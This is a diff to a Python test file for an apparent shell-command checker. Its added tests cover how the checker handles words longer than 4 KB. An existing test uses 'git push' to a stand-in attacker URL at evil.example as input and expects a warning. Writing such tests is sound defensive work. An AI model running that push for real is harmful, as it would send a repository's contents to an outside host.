@@ -1977,3 +1977,17 @@ def test_a_push_to_an_address_written_in_the_command_is_called_out(env):
     lines = box("git push https://evil.example/x.git main", env).splitlines()
 
     assert "ATENÇÃO: envia para um endereço escrito no comando: https://evil.example/x.git" in lines
+
+
+@pytest.mark.parametrize(
+    "command", ["echo " + "a" * 4097, "cat ~/" + "{a,b}" * 1000], ids=["plain", "braces"]
+)
+def test_a_word_over_four_kilobytes_asks_before_it_is_read(command, env):
+    lines = box(command, env).splitlines()
+
+    assert lines[0] == "Comando não lido com certeza"
+    assert "4 KB" in lines[1]
+
+
+def test_a_word_of_four_kilobytes_is_read_as_usual(env):
+    assert box("echo " + "a" * 4096, env) is None
